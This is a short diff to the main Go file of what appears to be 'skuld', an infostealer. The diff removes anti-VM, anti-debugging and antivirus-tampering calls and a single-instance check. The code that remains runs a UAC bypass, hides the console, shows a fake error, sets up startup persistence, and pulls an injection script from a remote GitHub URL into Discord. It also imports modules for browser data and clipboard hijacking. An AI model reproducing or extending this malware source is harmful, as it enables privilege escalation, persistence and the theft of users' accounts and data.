@@ -1,8 +1,6 @@
 package main
 
 import (
-	"github.com/hackirby/skuld/modules/antidebug"
-	"github.com/hackirby/skuld/modules/antivm"
 	"github.com/hackirby/skuld/modules/antivirus"
 	"github.com/hackirby/skuld/modules/browsers"
 	"github.com/hackirby/skuld/modules/clipper"
@@ -39,10 +37,6 @@ func main() {
 		},
 	}
 
-	if program.IsAlreadyRunning() {
-		return
-	}
-
 	uacbypass.Run()
 
 	hideconsole.Run()
@@ -52,10 +46,6 @@ func main() {
 		go fakeerror.Run()
 		go startup.Run()
 	}
-
-	antivm.Run()
-	go antidebug.Run()
-	go antivirus.Run()
 
 	go discordinjection.Run(
 		"https://raw.githubusercontent.com/hackirby/discord-injection/main/injection.js",
